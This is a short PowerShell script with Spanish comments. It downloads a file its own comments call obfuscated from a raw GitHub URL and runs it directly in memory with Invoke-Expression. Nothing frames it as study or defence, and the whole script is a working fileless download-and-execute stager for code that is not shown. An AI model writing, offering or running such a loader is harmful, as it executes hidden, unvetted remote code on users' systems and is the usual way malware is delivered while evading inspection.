# URL del archivo en formato raw de GitHub
$url = "https://raw.githubusercontent.com/sASSmat23/PS/refs/heads/main/ps1"  # URL del archivo obfuscado en GitHub

# Descargar el contenido del archivo en memoria
try {
    $codigoObfuscado = Invoke-WebRequest -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content
    Write-Output "Código descargado exitosamente desde GitHub."
}
catch {
    Write-Output "Error al descargar el archivo: $_"
    exit
}

# Ejecutar el código obfuscado directamente desde la memoria
try {
    Invoke-Expression $codigoObfuscado
    Write-Output "El código se ha ejecutado exitosamente."
}
catch {
    Write-Output "Error al ejecutar el código: $_"
}
